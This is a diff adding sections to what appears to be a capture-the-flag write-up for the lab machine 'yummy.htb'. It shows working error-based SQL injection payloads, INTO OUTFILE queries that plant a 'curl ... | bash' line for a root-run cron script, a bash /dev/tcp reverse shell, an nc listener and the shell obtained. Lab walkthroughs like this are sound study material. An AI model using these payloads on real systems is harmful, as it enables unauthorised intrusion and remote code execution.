@@ -449,3 +449,158 @@ def admindashboard():
             connection.close()
 ⋮
 ```
+
+### 5.1. Testing for error-based SQL injection
+
+The reservation search function uses `?s=value&o=ASC` HTTP GET parameters to perform the database query:
+
+![image](https://github.com/user-attachments/assets/4a6a8cb3-b7fe-4c11-91b0-e576995a0bc1)
+
+Appending a `UNION` statement to the query reveals that the webapp is susceptible to error-based SQL injection:
+
+Query: `?s=test&o=ASC UNION SELECT 1,2,3;`
+
+Response: `(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT 1,2,3' at line 1")`
+
+![image](https://github.com/user-attachments/assets/e9838e5e-8806-4db9-bad1-4fdf0ee2c100)
+
+### 5.2. Trying to retrieve user
+
+Query: `?s=test&o=ASC;SELECT (EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),0x7e)));`
+
+Response: `(1105, "XPATH syntax error: '~chef@localhost~'")`
+
+![image](https://github.com/user-attachments/assets/bd34c2b3-914b-49a3-8118-a5508b502531)
+
+### 5.3. Attempt to retrieve account passwords
+
+Identifying column names for `users` table:
+
+Query: `?s=test&o=ASC;SELECT EXTRACTVALUE(1,CONCAT(0x5c,(SELECT group_concat(column_name) from information_schema.columns where table_name='users')))`
+
+Response: `(1105, "XPATH syntax error: '\\email,id,password,role_id'")`
+
+![image](https://github.com/user-attachments/assets/8fd4491f-9598-4c0a-9b5f-24bd444f7f7b)
+
+Attempt to retrieve `@@secure_file_priv`
+
+Query: `?s=test&o=ASC;SELECT EXTRACTVALUE(1,CONCAT(0x5c,(SELECT @@secure_file_priv is NULL)))`
+
+Response: `(1105, "XPATH syntax error: '\\0'")`
+
+![image](https://github.com/user-attachments/assets/b7b5844f-824a-40a7-bba8-519d1ac470a9)
+
+Query: `http://yummy.htb/admindashboard?s=test&o=ASC;SELECT%20EXTRACTVALUE(1,CONCAT(0x5c,(SELECT%20@@secure_file_priv)))`
+
+Response: `(1105, "XPATH syntax error: '\\'")`
+
+The `secure_file_priv` is not `NULL`, but no results when trying to retrieve the value
+
+### 5.4. Attempt to inject malicious files using `INTO OUTFILE`
+
+#### 5.4.1. Analyze possible attack vector
+
+Recall previously when exploring `/etc/crontab`, the `/data/scripts/dbmonitor.sh` is set to run every minute
+
+Retrieve the script with the path traversal method previously used `GET /export/../../../../../../data/scripts/dbmonitor.sh HTTP/1.1`
+
+```sh
+#!/bin/bash
+
+timestamp=$(/usr/bin/date)
+service=mysql
+response=$(/usr/bin/systemctl is-active mysql)
+
+if [ "$response" != 'active' ]; then
+    /usr/bin/echo "{"status": "The database is down", "time": "$timestamp"}" > /data/scripts/dbstatus.json
+    /usr/bin/echo "$service is down, restarting!!!" | /usr/bin/mail -s "$service is down!!!" root
+    latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
+    /bin/bash "$latest_version"
+else
+    if [ -f /data/scripts/dbstatus.json ]; then
+        if grep -q "database is down" /data/scripts/dbstatus.json 2>/dev/null; then
+            /usr/bin/echo "The database was down at $timestamp. Sending notification."
+            /usr/bin/echo "$service was down at $timestamp but came back up." | /usr/bin/mail -s "$service was down!" root
+            /usr/bin/rm -f /data/scripts/dbstatus.json
+        else
+            /usr/bin/rm -f /data/scripts/dbstatus.json
+            /usr/bin/echo "The automation failed in some way, attempting to fix it."
+            latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
+            /bin/bash "$latest_version"
+        fi
+    else
+        /usr/bin/echo "Response is OK."
+    fi
+fi
+
+[ -f dbstatus.json ] && /usr/bin/rm -f dbstatus.json
+```
+
+The script logic:
+1. If MySQL service **is not active**:
+  - Log `The database is down` into `dbstatus.json` and notify using `/usr/bin/mail`
+  - Fix the issue by looking for the `latest_version` script and running it
+2. If MySQL service **is active**:
+  a. If `dbstatus.json` **exist**:
+    i. If `database is down` exist in `dbstatus.json`: indicates that MySQL was previously down, but came back up, delete `dbstatus.json`
+    ii. Else: the automation didn't work, fix the issue by looking for the `latest_version` script and running it
+  b. If `dbstatus.json` **does not exist**: MySQL is ok → `Response is OK.`
+
+Possible attack vector:
+1. MySQL service **is active**
+2. Create `dbstatus.json` with arbitrary data
+3. The scheduled task should attempt to run `/data/scripts/fixer-v*`
+
+#### 5.4.2. Get a reverse shell by leveraging the attack vector
+
+Prepare reverse shell script in Apache:
+
+```sh
+cat << EOF > /var/www/html/rev.sh
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.20/4444 0>&1
+EOF
+```
+
+Start listener in Kali
+
+```sh
+rlwrap nc -nlvp 4444
+```
+
+Create `dbstatus.json` file:
+
+Query: `?s=test&o=ASC;SELECT+"curl+10.10.14.20/rev.sh+|bash;"+INTO+OUTFILE++'/data/scripts/dbstatus.json';`
+
+There's no error in creating the file if it does not already exist, rerun the same query to confirm that the file is created:
+
+![image](https://github.com/user-attachments/assets/d5db7abb-c668-4458-81e9-08b7916d372a)
+
+Create `fixer-v___` file:
+
+Query: `?s=test&o=ASC;SELECT+"curl+10.10.14.20/rev.sh+|bash;"+INTO+OUTFILE++'/data/scripts/fixer-v___';`
+
+There's no error in creating the file if it does not already exist, rerun the same query to confirm that the file is created:
+
+![image](https://github.com/user-attachments/assets/8c326cf4-61e7-496e-b98e-c467b5691d41)
+
+> [!Tip]
+> 
+> The Apache logs would show when the target retrieve the reverse shell script, this can be useful for troubleshooting:
+> 
+> ```console
+> root@kali:~# tail -f /var/log/apache2/access.log
+> 10.10.11.36 - - [11/Jan/2025:16:06:33 +0800] "GET /rev.sh HTTP/1.1" 200 281 "-" "curl/8.5.0"
+> ```
+
+Reverse shell hooked:
+
+```console
+connect to [10.10.14.20] from (UNKNOWN) [10.10.11.36] 41584
+bash: cannot set terminal process group (26159): Inappropriate ioctl for device
+bash: no job control in this shell
+mysql@yummy:/var/spool/cron$ id
+id
+uid=110(mysql) gid=110(mysql) groups=110(mysql)
+mysql@yummy:/var/spool/cron$
+```
